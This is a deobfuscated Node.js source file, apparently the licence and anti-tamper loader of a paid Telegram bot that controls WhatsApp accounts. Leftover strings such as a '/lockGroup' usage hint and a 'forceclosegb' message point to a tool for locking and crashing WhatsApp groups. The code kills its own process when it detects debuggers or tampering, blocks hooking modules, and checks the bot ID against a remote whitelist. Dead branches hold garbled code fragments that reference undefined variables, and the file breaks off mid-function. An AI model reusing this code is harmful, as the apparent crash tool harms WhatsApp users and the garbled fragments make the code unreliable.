const originalProcessExit = process.exit;
Object.defineProperty(process, "exit", {
  value: function (code) {
    return originalProcessExit(code);
  },
  writable: false,
  configurable: false
});
const originalProcessKill = process.kill;
Object.defineProperty(process, "kill", {
  value: function (pid, signal) {
    return originalProcessKill(pid, signal);
  },
  writable: false,
  configurable: false
});
const originalProcessAbort = process.abort;
Object.defineProperty(process, "abort", {
  value: function () {
    return originalProcessAbort();
  },
  writable: false,
  configurable: false
});
const fsModule = require("fs"),
  osModule = require("os"),
  pathModule = require("path");
(function initConsoleGuard() {
  const suspiciousKeywords = ["YAMETE"];
  const originalConsole = {};
  originalConsole.log = console.log;
  originalConsole.warn = console.warn;
  originalConsole.error = console.error;
  originalConsole.info = console.info;

  function detectSuspiciousKeyword(args) {
    for (let i = 0; i < args.length; i++) {
      const text = String(args[i]).toUpperCase();
      for (const keyword of suspiciousKeywords) {
        if (text.includes("[" + keyword + "]") || text.includes("[ " + keyword + " ]") || text.includes(keyword + " DETECTED") || text.includes("RUNNING " + keyword)) {
          return keyword;
        }
      }
    }
    return null;
  }

  function wrapConsoleMethod(methodName) {
    console[methodName] = function (...args) {
      const detected = detectSuspiciousKeyword(args);
      if (detected) {
        const flow = "7|5|2|6|0|3|1|4".split("|");
        let step = 0;
        while (true) {
          switch (flow[step++]) {
            case "0":
              originalConsole.error("[0m");
              continue;
            case "1":
              try {
                process.exit(1);
              } catch (e) {}
              continue;
            case "2":
              originalConsole.error("  TERDETEKSI LOG MENCURIGAKAN: " + detected);
              continue;
            case "3":
              try {
                process.kill(process.pid, "SIGKILL");
              } catch (e) {}
              continue;
            case "4":
              return;
            case "5":
              originalConsole.error("  [!!!] SECURITY ALERT !!!  ");
              continue;
            case "6":
              originalConsole.error("  AKSES DITOLAK TERDETEKSI MEMBYPASS SCRIPT.");
              continue;
            case "7":
              originalConsole.error("[41m[37m[1m");
              continue;
          }
          break;
        }
      }
      return originalConsole[methodName].apply(console, args);
    };
  }
  wrapConsoleMethod("log");
  wrapConsoleMethod("warn");
  wrapConsoleMethod("error");
  wrapConsoleMethod("info");
})();
const securityModule = function () {
  const killLogPath = pathModule.join(osModule.tmpdir(), ".ak72_kill.log"),
    ignoredFiles = ["node_modules", "database", "Tools", "session", "logs", "tmp", "owner", ".cache", ".npm", ".npm-cache", ".yarn", ".git", ".config", "package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml", "start.sh", "start.bat", "entrypoint.sh", ".env", ".gitignore", ".dockerignore", "Dockerfile"],
    allowedScriptFiles = ["config.js", "Ak72chflowXB4890.js", "GxionXB-Health.js", "update-hash.js", "hash-block.js", "pairing.js"];
  let alreadyKilled = false;
  let lastCheckTime = 0;
  const checkInterval = 4000,
    pinnedFs = {};
  pinnedFs.readFileSync = fsModule.readFileSync;
  pinnedFs.writeFileSync = fsModule.writeFileSync;
  pinnedFs.appendFileSync = fsModule.appendFileSync;
  pinnedFs.rmSync = fsModule.rmSync;
  pinnedFs.existsSync = fsModule.existsSync;
  pinnedFs.readdirSync = fsModule.readdirSync;
  pinnedFs.exit = process.exit;
  pinnedFs.kill = process.kill;
  pinnedFs.abort = process.abort;

  function hardKill(reason) {
    if (alreadyKilled) return;
    alreadyKilled = true;
    try {
      console.log("");
      console.log("[41m[37m[1m [SYSTEM] KILLED (OK) — " + reason + " [0m");
      console.log("[SYSTEM] Time: " + new Date().toISOString());
      console.log("");
    } catch (e) {}
    try {
      pinnedFs.appendFileSync(killLogPath, Date.now() + " | " + reason + "\n");
    } catch (e) {}
    try {
      pinnedFs.kill(process.pid, "SIGKILL");
    } catch (e) {}
    try {
      pinnedFs.abort();
    } catch (e) {}
    try {
      pinnedFs.exit(1);
    } catch (e) {}
  }

  function detectExtraFiles() {
    try {
      const cwd = process.cwd(),
        readOptions = {};
      readOptions.withFileTypes = true;
      const entries = pinnedFs.readdirSync(cwd, readOptions),
        findings = [];
      let jsFileCount = 0;
      for (const entry of entries) {
        const name = entry.name,
          lowerName = name.toLowerCase();
        if (ignoredFiles.includes(lowerName)) continue;
        if (lowerName.startsWith(".")) continue;
        if (entry.isDirectory()) {
          if (lowerName.includes("bypass") || lowerName.includes("inject") || lowerName.includes("exploit") || lowerName.includes("hook") || lowerName.includes("patch") || lowerName.includes("cheat")) {
            const item = {};
            item.name = name;
            item.reason = "suspicious-dir";
            findings.push(item);
          }
          continue;
        }
        if (lowerName.includes("bypass") || lowerName.includes("inject") || lowerName.includes("hook") || lowerName.includes("exploit") || lowerName.includes("cheat") || lowerName.includes("patch")) {
          const item = {};
          item.name = name;
          item.reason = "suspicious-name";
          findings.push(item);
          continue;
        }
        if (lowerName.endsWith(".js") || lowerName.endsWith(".mjs") || lowerName.endsWith(".cjs")) {
          if (allowedScriptFiles.includes(name)) continue;
          jsFileCount++;
          if (jsFileCount > 5) {
            const item = {};
            item.name = name;
            item.reason = "extra-js-limit";
            findings.push(item);
          }
          continue;
        }
        if (lowerName.endsWith(".sh") || lowerName.endsWith(".bat") || lowerName.endsWith(".exe") || lowerName.endsWith(".dll") || lowerName.endsWith(".so") || lowerName.endsWith(".bin")) {
          const item = {};
          item.name = name;
          item.reason = "executable-file";
          findings.push(item);
          continue;
        }
      }
      return findings;
    } catch (e) {
      return [];
    }
  }

  function detectInspectorFlags() {
    try {
      if (Array.isArray(process.execArgv)) {
        for (const arg of process.execArgv)
          if (/^--inspect/.test(arg) || /^--debug/.test(arg)) return true;
      }
      if (process.env.NODE_OPTIONS && /--inspect|--debug/.test(process.env.NODE_OPTIONS)) return true;
    } catch (e) {}
    return false;
  }

  function verifyPins() {
    return process.exit === pinnedFs.exit && process.kill === pinnedFs.kill && process.abort === pinnedFs.abort && fsModule.readFileSync === pinnedFs.readFileSync;
  }

  function runProtectChecks() {
    const now = Date.now();
    if (now - lastCheckTime < checkInterval) return;
    lastCheckTime = now;
    if (!verifyPins()) return hardKill("PIN_OVERWRITTEN");
    const extra = detectExtraFiles();
    if (extra.length > 0) {
      const summary = extra.map(item => item.name + " (" + item.reason + ")").join(", ");
      return hardKill("Extra files detected: " + summary);
    }
    if (detectInspectorFlags()) return hardKill("Inspector/Debugger attached");
  }
  const api = {};
  api.hardKill = hardKill;
  api.runProtectChecks = runProtectChecks;
  api.detectExtraFiles = detectExtraFiles;
  api.verifyPins = verifyPins;
  return api;
}();
global.PROTECT = securityModule;
const hardKillDescriptor = {};
hardKillDescriptor.value = securityModule.hardKill;
hardKillDescriptor.writable = false;
hardKillDescriptor.configurable = false;
hardKillDescriptor.enumerable = true;
Object.defineProperty(global.PROTECT, "hardKill", hardKillDescriptor);
const runProtectChecksDescriptor = {};
runProtectChecksDescriptor.value = securityModule.runProtectChecks;
runProtectChecksDescriptor.writable = false;
runProtectChecksDescriptor.configurable = false;
runProtectChecksDescriptor.enumerable = true;
Object.defineProperty(global.PROTECT, "runProtectChecks", runProtectChecksDescriptor);
const originalRequire = require;
try {
  global.require = new Proxy(originalRequire, {
    apply: function (target, thisArg, args) {
      const helper = {};
      helper.toolsDir = "./Tools";
      helper.defaultMode = "self";
      helper.utf8 = "utf8";
      helper.equals = function (a, b) {
        return a === b;
      };
      helper.stringType = "string";
      helper.notEquals = function (a, b) {
        return a !== b;
      };
      helper.tagA = "iiUkr";
      helper.tagB = "dfMnz";
      helper.concat = function (a, b) {
        return a + b;
      };
      helper.blockedPrefix = "Blocked module: ";
      const H = helper,
        moduleName = args[0] || "";
      if (H.equals(typeof moduleName, H.stringType)) {
        if (/node-inspector|ndb|hooker|proxyquire|mock-require|module-alias|require-inject|pkg-dir-hook|require-reload|clear-module|decache/.test(moduleName)) {
          if (H.notEquals(H.tagA, H.tagB)) global.PROTECT.hardKill(H.concat(H.blockedPrefix, moduleName));
          else try {
            if (!b.existsSync(U.MODE_FILE)) {
              const mkdirOpts = {};
              mkdirOpts.recursive = true;
              O.mkdirSync(H.toolsDir, mkdirOpts);
              const modeObj = {};
              modeObj.mode = H.defaultMode;
              q.writeFileSync(A.MODE_FILE, u.stringify(modeObj, null, 2));
              return H.defaultMode;
            }
            const parsed = T.parse(Z.readFileSync(r.MODE_FILE, H.utf8));
            return parsed.mode || H.defaultMode;
          } catch {
            return "self";
          }
        }
      }
      return target.apply(thisArg, args);
    }
  });
} catch (requireProxyError) {}
setInterval(securityModule.runProtectChecks, 4000);
const chalk = require("chalk"),
  crypto = require("crypto"),
  https = require("https"),
  os = require("os"),
  fs = require("fs"),
  path = require("path"),
  moment = require("moment-timezone"),
  pino = require("pino"),
  axios = require("axios"),
  vm = require("vm"),
  {
    Octokit
  } = require("@octokit/rest"),
  {
    Telegraf,
    Markup,
    RichMessage,
    session: telegrafSession
  } = require("@icanseeuanywhere/telekaf"),
  {
    RichHTMLBuilder
  } = RichMessage,
  UI = {
    banner: chalk.hex("#bd93f9").bold(`
    
██████╗  █████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
██║  ██║███████║██████╔╝█████╔╝ 
██║  ██║██╔══██║██╔══██╗██╔═██╗ 
██████╔╝██║  ██║██║  ██║██║  ██╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝`),
    line: chalk.hex("#6272a4")("─".repeat(48)),
    ok: chalk.hex("#50fa7b")("✓"),
    fail: chalk.hex("#ff5555")("✗"),
    warn: chalk.hex("#f1fa8c")("⚠"),
    info: chalk.hex("#8be9fd")("•"),
    arrow: chalk.hex("#bd93f9")("➜")
  };

function printBanner() {
  const helper = {};
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.accentColor = "#6272a4";
  helper.spacer = "       ";
  helper.brandLeft = "THE - DARK";
  helper.brandRight = " HY HATTERS";
  const H = helper;
  try {
    console.log(UI.banner);
    console.log(H.concat(H.concat(chalk.hex(H.accentColor)(H.spacer), chalk.white.bold(H.brandLeft)), chalk.hex(H.accentColor)(H.brandRight)));
    console.log(UI.line);
    console.log("");
  } catch (e) {}
}

function logStatusRow(iconKey, label, detail) {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.marker = "OkUMG";
  const H = helper;
  try {
    if (H.equals("OkUMG", H.marker)) {
      const icon = UI[iconKey] || UI.info,
        labelText = chalk.hex("#8be9fd")(label.padEnd(18, " ")),
        detailText = detail ? chalk.white(detail) : "";
      console.log("  " + icon + "  " + labelText + detailText);
    } else return a.COOLDOWN_TIME = 0, f.COOLDOWN_TEXT = "0s", C.reply("✅ Cooldown dimatikan");
  } catch (e) {}
}

function logSuccess(message) {
  const helper = {};
  helper.successColor = "#50fa7b";
  const H = helper;
  try {
    console.log("  " + UI.ok + "  " + chalk.hex(H.successColor).bold(message));
  } catch (e) {}
}

function logFailure(title, detail) {
  const helper = {};
  helper.lockHint = "🪧 Example: /lockGroup <link_grup_wa>\n🚀 Support: chat.whatsapp.com/xxxxx\n📌 Atau ID grup langsung: 123xxx@g.us\n⚠️ Wajib jeda 5-10 detik antar eksekusi";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "YOQqS";
  helper.tagB = "EOdRj";
  const H = helper;
  try {
    if (H.equals(H.tagA, H.tagB)) return title.reply(H.lockHint);
    else {
      console.log("  " + UI.fail + "  " + chalk.hex("#ff5555").bold(title));
      if (detail) console.log("     " + chalk.gray(detail));
    }
  } catch (e) {}
}

function printLine() {
  try {
    console.log(UI.line);
  } catch (e) {}
}

function printCheckingServer() {
  const helper = {};
  helper.color = "#f1fa8c";
  const H = helper;
  console.log(chalk.hex(H.color).bold("\n╭─༺CHECKING SERVER༻─╮\n│➤ Bot Sedang Memeriksa Akses...   \n╰────────────────────╯\n"));
}

function printServerConnected() {
  const helper = {};
  helper.color = "#50fa7b";
  const H = helper;
  console.log(chalk.hex(H.color).bold("\n╭─༺CHECKING SERVER༻─╮\n│➤ Bot Sukses Terhubung Terimakasih \n╰───────────────────╯\n"));
}

function printAccessDenied() {
  const helper = {};
  helper.color = "#ff5555";
  const H = helper;
  console.log(chalk.hex(H.color).bold("\n╭─༺ SEE YOU KANG BYPASS!!!!! ༻─╮\n│➤ Akses Ditolak, Kamu terdeteksi Membypass\n│Paksa Script Ini !! \n╰─────────────────────────╯\n"));
}
let baileysDefault, baileysUseMultiFileAuthState, baileysDisconnectReason, baileysFetchLatestVersion;
async function loadBaileys() {
  const helper = {};
  helper.moduleName = "@whiskeysockets/baileys";
  const H = helper;
  const baileys = await import(H.moduleName);
  baileysDefault = baileys.default;
  baileysUseMultiFileAuthState = baileys.useMultiFileAuthState;
  baileysDisconnectReason = baileys.DisconnectReason;
  baileysFetchLatestVersion = baileys.fetchLatestBaileysVersion;
}
const {
  TOKEN_BOT: BOT_TOKEN,
  OWNER_ID: OWNER_ID
} = require("./config"),
  configuredBotToken = BOT_TOKEN,
  githubRepoConfig = {};
githubRepoConfig.owner = "zentrume01-lang";
githubRepoConfig.repo = "yangbypassyatim";
githubRepoConfig.path = "tokens.json";
githubRepoConfig.branch = "main";
const GITHUB_REPO = githubRepoConfig,
  SIGNATURE_SECRET = "SINZX",
  SIGNATURE_MIN_LENGTH = 8,
  TOKENS_SIGNATURE = "dark-v4-sig-2026";
let githubToken = null;
try {
  const configFile = require("./config");
  githubToken = configFile.GITHUB_TOKEN || null;
} catch (configError) {}
const requestTimeout = {};
requestTimeout.timeout = 8000;
const octokitOptions = {};
octokitOptions.userAgent = "AK72-Validator/4.0";
octokitOptions.auth = githubToken || undefined;
octokitOptions.request = requestTimeout;
const octokit = new Octokit(octokitOptions),
  integrityChecks = {};
integrityChecks.debuggerDetected = false;
integrityChecks.inspectorDetected = false;
integrityChecks.tamperedEnv = false;
integrityChecks.suspiciousArgv = false;
integrityChecks.vmDetected = false;
integrityChecks.proxyDetected = false;
const validationState = {};
validationState.validatedAt = 0;
validationState.validateInterval = 300000;
validationState.botId = null;
validationState.isBotValid = false;
validationState.allowedIDs = [];
validationState.lastCheck = 0;
validationState.cacheDuration = 60000;
validationState.killed = false;
validationState.integrityChecks = integrityChecks;
const validation = validationState,
  KILL_REASONS = {};
KILL_REASONS.debug = "Debugger terdeteksi";
KILL_REASONS.inspector = "Inspector aktif";
KILL_REASONS.env = "Environment dimodifikasi";
KILL_REASONS.argv = "Argument mencurigakan";
KILL_REASONS.vm = "Virtual machine terdeteksi";
KILL_REASONS.proxy = "Proxy terdeteksi";
KILL_REASONS.hotlink = "Link GitHub bocor / diakses pihak ketiga";
KILL_REASONS.whitelist = "Bot ID dihapus dari whitelist";
KILL_REASONS.format = "Format token tidak valid";
KILL_REASONS.signature = "Signature tokens.json invalid";
KILL_REASONS.expired = "tokens.json kedaluwarsa";
KILL_REASONS.extra = "File tambahan terdeteksi";
const killReasons = KILL_REASONS,
  IS_CONTAINERIZED = process.env.PTERODACTYL || process.env.WINGS || process.env.DOCKER || process.env.CONTAINER || fs.existsSync("/.dockerenv") || fs.existsSync("/run/.containerenv"),
  TOKEN_MIRRORS = ["https://raw.githubusercontent.com/zentrume01-lang/yangbypassyatim/refs/heads/main/tokens.json"];

function emergencyShutdown(reason) {
  const helper = {};
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagA = "QNSqj";
  helper.tagB = "zyvGd";
  const H = helper;
  if (validation.killed) return;
  validation.killed = true;
  try {
    if (H.notEquals(H.tagA, H.tagB)) {
      const crashLog = path.join(os.tmpdir(), ".ak72_crash_" + Date.now() + ".log");
      fs.writeFileSync(crashLog, new Date().toISOString() + " | " + reason + "\n");
    } else return a.log(f.yellow("⚠️ [forceclosegb] " + C.message)), false;
  } catch (e) {}
  PROTECT.hardKill(reason);
}

function detectDebuggerFlags() {
  const helper = {};
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.notEquals2 = function (a, b) {
    return a !== b;
  };
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "aFrLD";
  helper.debugFlag = "--debug";
  const H = helper;
  try {
    if (H.equals("FaSxO", H.tagA)) {
      if (H.notEquals(typeof a, "string")) return false;
      const parts = f.split(":");
      if (H.notEquals2(parts.length, 2)) return false;
      const first = parts[0].trim(),
        second = parts[1].trim();
      if (!/^\d{6,20}$/.test(first)) return false;
      if (H.lessThan(second.length, first)) return false;
      return true;
    } else {
      const execArgs = process.execArgv || [];
      for (const arg of execArgs) {
        if (/^--inspect(?!-port)/.test(arg) || arg === H.debugFlag) return validation.integrityChecks.debuggerDetected = true, true;
      }
      if (process.env.NODE_OPTIONS && /--inspect|--debug/.test(process.env.NODE_OPTIONS)) return validation.integrityChecks.debuggerDetected = true, true;
    }
  } catch (e) {}
  return false;
}

function detectInspectorFlags() {
  try {
    for (const arg of process.execArgv || []) {
      if (/--inspect|--debug|--inspect-brk/.test(arg)) {
        return validation.integrityChecks.inspectorDetected = true, true;
      }
    }
    if (process.env.NODE_OPTIONS && /--inspect|--debug/.test(process.env.NODE_OPTIONS)) return validation.integrityChecks.inspectorDetected = true, true;
  } catch (e) {}
  return false;
}

function detectSuspiciousLoaderArgs() {
  const helper = {};
  helper.lockedMessage = "Bot telah di kunci oleh Owner";
  helper.loaderFlag = "--experimental-loader";
  helper.loaderShortFlag = "--loader";
  helper.tag = "fOyoS";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.concat = function (a, b) {
    return a + b;
  };
  const H = helper;
  try {
    const loaderFlags = [H.loaderFlag, H.loaderShortFlag];
    for (const arg of (process.argv || []).slice(2)) {
      if ("fOyoS" !== H.tag) {
        const alert = {};
        alert.show_alert = true;
        return alert.answerCbQuery(H.lockedMessage, alert);
      } else
        for (const flag of loaderFlags) {
          if (H.equals(arg, flag) || arg.startsWith(H.concat(flag, "="))) return validation.integrityChecks.suspiciousArgv = true, true;
        }
    }
  } catch (e) {}
  return false;
}

function runEnvironmentChecks() {
  try {
    if (IS_CONTAINERIZED) {
      const opts = {};
      opts.skipVM = true;
      PROTECT.runProtectChecks(opts);
      return;
    }
    if (detectDebuggerFlags()) PROTECT.hardKill(killReasons.debug);
    if (detectInspectorFlags()) PROTECT.hardKill(killReasons.inspector);
    if (detectSuspiciousLoaderArgs()) PROTECT.hardKill(killReasons.argv);
    PROTECT.runProtectChecks();
  } catch (e) {}
}

function verifyCallerIntegrity() {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.undefinedType = "undefined";
  helper.missingModuleMsg = "Module context hilang";
  helper.missingProcessMsg = "Process hilang";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.brokenSignatureMsg = "Signature integrity rusak";
  const H = helper;
  if (H.equals(typeof module, H.undefinedType)) PROTECT.hardKill(H.missingModuleMsg);
  if (typeof require === H.undefinedType) PROTECT.hardKill("Require hilang");
  if (typeof process === "undefined") PROTECT.hardKill(H.missingProcessMsg);
  const computed = H.concat(SIGNATURE_SECRET.length, SIGNATURE_MIN_LENGTH);
  if (H.notEquals(computed, 22)) PROTECT.hardKill(H.brokenSignatureMsg);
}

function checkGitHubRawReachable() {
  return new Promise(resolve => {
    const url = "https://raw.githubusercontent.com/" + GITHUB_REPO.owner + "/" + GITHUB_REPO.repo + "/" + GITHUB_REPO.branch + "/" + GITHUB_REPO.path;
    let settled = false;
    const done = result => {
      if (settled) return;
      settled = true;
      resolve(result);
    };
    let request;
    try {
      const opts = {};
      opts.timeout = 8000;
      request = https.get(url, opts, response => {
        response.resume();
        if (response.statusCode !== 200) return done({
          ok: false,
          reason: "raw link status " + response.statusCode
        });
        const result = {};
        result.ok = true;
        done(result);
      });
    } catch (err) {
      const result = {};
      result.ok = false;
      result.reason = "raw req error: " + err.message;
      return done(result);
    }
    request.on("error", err => done({
      ok: false,
      reason: "raw link error: " + err.message
    }));
    request.on("timeout", () => {
      try {
        request.destroy();
      } catch (e) {}
      const result = {};
      result.ok = false;
      result.reason = "raw link timeout";
      done(result);
    });
  });
}

function isValidTokenFormat(token) {
  const helper = {};
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.notEquals2 = function (a, b) {
    return a !== b;
  };
  helper.lessThan = function (a, b) {
    return a < b;
  };
  const H = helper;
  if (H.notEquals(typeof token, "string")) return false;
  const parts = token.split(":");
  if (H.notEquals2(parts.length, 2)) return false;
  const id = parts[0].trim(),
    secret = parts[1].trim();
  if (!/^\d{6,20}$/.test(id)) return false;
  if (H.lessThan(secret.length, SIGNATURE_MIN_LENGTH)) return false;
  return true;
}

function validateTokensObject(tokensObject) {
  const notObjectResult = {};
  notObjectResult.ok = false;
  notObjectResult.reason = "bukan object";
  if (!tokensObject || typeof tokensObject !== "object") return notObjectResult;
  const notArrayResult = {};
  notArrayResult.ok = false;
  notArrayResult.reason = "field ids bukan array";
  if (!Array.isArray(tokensObject.ids)) return notArrayResult;
  const emptyResult = {};
  emptyResult.ok = false;
  emptyResult.reason = "ids kosong";
  if (tokensObject.ids.length === 0) return emptyResult;
  for (const id of tokensObject.ids) {
    if (!/^\d{6,20}$/.test(String(id).trim())) return {
      ok: false,
      reason: "id invalid: " + id
    };
  }
  if (tokensObject.sig !== undefined && tokensObject.sig !== TOKENS_SIGNATURE) {
    const sigResult = {};
    sigResult.ok = false;
    sigResult.reason = "signature mismatch";
    return sigResult;
  }
  if (tokensObject.expires && tokensObject.expires > 0 && tokensObject.expires < Math.floor(Date.now() / 1000)) {
    const expiredResult = {};
    expiredResult.ok = false;
    expiredResult.reason = "tokens.json expired";
    return expiredResult;
  }
  const okResult = {};
  okResult.ok = true;
  return okResult;
}
async function fetchTokensFromGitHub() {
  const hotlinkCheck = await checkGitHubRawReachable();
  if (!hotlinkCheck.ok) {
    throw new Error("Hotlink check gagal: " + hotlinkCheck.reason);
  }
  const contentParams = {};
  contentParams.owner = GITHUB_REPO.owner;
  contentParams.repo = GITHUB_REPO.repo;
  contentParams.path = GITHUB_REPO.path;
  contentParams.ref = GITHUB_REPO.branch;
  const {
    data: contentResponse
  } = await octokit.rest.repos.getContent(contentParams);
  if (!contentResponse || !contentResponse.content) {
    throw new Error("File content kosong / tidak ditemukan");
  }
  const decoded = Buffer.from(contentResponse.content, "base64").toString("utf8"),
    parsedTokens = JSON.parse(decoded),
    validationResult = validateTokensObject(parsedTokens);
  if (!validationResult.ok) {
    throw new Error("tokens.json invalid: " + validationResult.reason);
  }
  const result = {};
  result.database = parsedTokens;
  result.source = "github.com/" + GITHUB_REPO.owner + "/" + GITHUB_REPO.repo + "/" + GITHUB_REPO.path;
  return result;
}
async function checkBotIdWithOctokit(token, forceRefresh) {
  if (forceRefresh === undefined) forceRefresh = false;
  try {
    const now = Date.now();
    if (!forceRefresh && now - validation.lastCheck < validation.cacheDuration) return validation.isBotValid;
    validation.lastCheck = now;
    if (!isValidTokenFormat(token)) return validation.botId = null, validation.isBotValid = false, false;
    const botId = token.split(":")[0].trim();
    validation.botId = botId;
    const fetched = await fetchTokensFromGitHub(),
      ids = fetched.database.ids.map(id => String(id).trim());
    validation.allowedIDs = ids;
    const isAllowed = ids.includes(botId);
    validation.isBotValid = isAllowed;
    return isAllowed;
  } catch (err) {
    if (validation.killed) return false;
    try {
      console.log(chalk.red("  " + UI.fail + "  checkBotID error: " + err.message));
    } catch (e) {}
    validation.isBotValid = false;
    return false;
  }
}
async function validateTokenWithOctokit(token) {
  printBanner();
  console.log(chalk.hex("#bd93f9").bold("  [ AK72 SECURITY VALIDATION ]"));
  printLine();
  logStatusRow("info", "Checking Bot ID", "Octokit mode...");
  console.log("");
  try {
    verifyCallerIntegrity();
    runEnvironmentChecks();
    logSuccess("Caller integrity OK");
    if (typeof token !== "string" || token.indexOf(":") === -1) {
      console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh"));
      process.exit(1);
      return false;
    }
    const botId = token.split(":")[0].trim();
    if (!isValidTokenFormat(token)) {
      console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh"));
      process.exit(1);
      return false;
    }
    logSuccess("Token format OK");
    logStatusRow("info", "Bot ID", botId);
    console.log("");
    validation.botId = botId;
    let fetched;
    try {
      fetched = await fetchTokensFromGitHub();
    } catch (err) {
      logFailure("Fetch database", err.message);
      logStatusRow("warn", "Mode", "Offline (bot tetap hidup)");
      validation.isBotValid = false;
      return false;
    }
    const database = fetched.database,
      source = fetched.source;
    logSuccess("Database fetched: " + source);
    console.log("");
    if (database.sig && database.sig !== TOKENS_SIGNATURE) {
      logFailure("SIGNATURE INVALID", "tokens.json dimodifikasi");
      PROTECT.hardKill(killReasons.signature);
      return false;
    }
    const ids = database.ids.map(id => String(id).trim());
    validation.allowedIDs = ids;
    const isAllowed = ids.includes(botId);
    if (!isAllowed) {
      console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh"));
      process.exit(1);
      return false;
    }
    console.log(chalk.hex("#50fa7b").bold(
  "\n" +
  "  ╔═╗═╗ ╦╦╔═╗╔╗╔\n" +
  "  ║ ╦╔╩╦╝║║ ║║║║\n" +
  "  ╚═╝╩ ╚═╩╚═╝╝╚╝\n" ));
    logSuccess("Bot ID Terdaftar");
    logStatusRow("info", "ID", botId);
    logSuccess("Access Diberikan");
    printLine();
    console.log("");
    validation.validatedAt = Date.now();
    validation.lastCheck = Date.now();
    validation.isBotValid = true;
    const periodicCheck = setInterval(async () => {
      try {
        if (validation.killed) return;
        runEnvironmentChecks();
        const now = Date.now();
        if (now - validation.validatedAt < validation.validateInterval) return;
        const refreshed = await fetchTokensFromGitHub();
        if (refreshed.database.sig && refreshed.database.sig !== TOKENS_SIGNATURE) {
          emergencyShutdown(killReasons.signature);
          return;
        }
        const stillAllowed = refreshed.database.ids.map(id => String(id).trim()).includes(String(botId));
        if (!stillAllowed) {
          emergencyShutdown(killReasons.whitelist);
          return;
        }
        validation.validatedAt = now;
        validation.isBotValid = true;
        validation.allowedIDs = refreshed.database.ids.map(id => String(id).trim());
      } catch (err) {
        if (validation.killed) return;
        try {
          console.log(chalk.yellow("  ⚠  Periodic validation skipped: " + err.message));
        } catch (e) {}
      }
    }, 60000);
    if (typeof periodicCheck.unref === "function") periodicCheck.unref();
    const integrityLoop = setInterval(() => {
      try {
        if (validation.killed) return;
        const opts = {};
        opts.skipVM = !!IS_CONTAINERIZED;
        PROTECT.runProtectChecks(opts);
        runEnvironmentChecks();
      } catch (err) {
        PROTECT.hardKill("Integrity checker crashed");
      }
    }, 3500);
    if (typeof integrityLoop.unref === "function") integrityLoop.unref();
    return true;
  } catch (err) {
    if (validation.killed) return false;
    printLine();
    logFailure("VALIDATION ERROR", err.message);
    return false;
  }
}
async function validateTokenWithMirrors() {
  printBanner();
  console.log(chalk.hex("#bd93f9").bold("  [ SECURITY VALIDATION ]"));
  printLine();
  logStatusRow("info", "Checking Bot ID", "Processing...");
  printCheckingServer();
  try {
    const botId = configuredBotToken && configuredBotToken.indexOf(":") !== -1 ? configuredBotToken.split(":")[0].trim() : null;
    botRuntime.botId = botId;
    if (!botId) {
      printAccessDenied();
      console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh"));
      process.exit(1);
      return false;
    }
    logStatusRow("info", "Bot ID", botId);
    const formatOk = isValidTokenFormat(configuredBotToken);
    if (!formatOk) {
      printAccessDenied();
      console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh"));
      process.exit(1);
      return false;
    }
    logSuccess("Token integrity OK");
    console.log("");
    let database = null,
      lastError = null;
    for (const mirror of TOKEN_MIRRORS) {
      try {
        logStatusRow("info", "Trying mirror", mirror.split("/")[2]);
        const headers = {};
        headers["Cache-Control"] = "no-cache";
        headers["User-Agent"] = "AK72-Validator/4.0";
        headers.Accept = "application/json";
        const requestOptions = {};
        requestOptions.timeout = 8000;
        requestOptions.headers = headers;
        const response = await axios.get(mirror, requestOptions);
        if (response.data && Array.isArray(response.data.ids)) {
          database = response.data;
          logSuccess("Mirror OK: " + mirror.split("/")[2]);
          break;
        }
      } catch (err) {
        lastError = err;
        logFailure("Mirror gagal: " + mirror.split("/")[2], err.message);
        continue;
      }
    }
    if (!database) {
      printLine();
      logFailure("SEMUA SOURCE GAGAL DIAKSES", lastError ? lastError.message : "Unknown");
      printAccessDenied();
      process.exit(1);
      return false;
    }
    const validationResult = validateTokensObject(database);
    if (!validationResult.ok) {
      logFailure("TOKENS.JSON INVALID", validationResult.reason);
      printAccessDenied();
      PROTECT.hardKill(killReasons.signature);
      return false;
    }
    const ids = database.ids.map(id => String(id).trim()),
      isAllowed = ids.includes(String(botId));
    if (!isAllowed) {
      printAccessDenied();
      console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh"));
      process.exit(1);
      return false;
    }
    console.log("");
    printServerConnected();
    logSuccess("ID TERDAFTAR");
    logStatusRow("info", "ID", botId);
    logSuccess("Access Granted");
    printLine();
    console.log("");
    botRuntime.validatedAt = Date.now();
    validation.isBotValid = true;
    validation.validatedAt = Date.now();
    validation.lastCheck = Date.now();
    validation.botId = botId;
    validation.allowedIDs = ids;
    const periodicCheck = setInterval(async () => {
      try {
        const now = Date.now();
        if (now - 0 < 300000) return;
        const headers = {};
        headers["Cache-Control"] = "no-cache";
        headers["User-Agent"] = "AK72-Validator/4.0";
        const requestOptions = {};
        requestOptions.timeout = 5000;
        requestOptions.headers = headers;
        const response = await axios.get(TOKEN_MIRRORS[0], requestOptions);
        if (!response.data || !Array.isArray(response.data.ids)) {
          console.log(chalk.redBright("  ❌ Periodic validation failed: invalid data"));
          return;
        }
        const checked = validateTokensObject(response.data);
        if (!checked.ok && checked.reason === "signature mismatch") {
          emergencyShutdown(killReasons.signature);
          return;
        }
        const stillAllowed = response.data.ids.map(id => String(id).trim()).includes(String(botId));
